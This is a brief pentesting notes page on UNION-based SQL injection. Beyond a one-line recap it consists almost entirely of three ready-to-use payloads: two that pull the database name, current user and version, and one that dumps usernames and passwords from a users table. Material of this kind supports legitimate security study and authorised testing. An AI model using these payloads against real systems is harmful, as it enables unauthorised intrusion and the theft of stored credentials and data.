# UNION Based SQL Injection





## Recap

UNION clauses allow for an additional SQL statement. It's always worth testing for this type of injection.



### Examples

```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



```sql
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```

> \
>
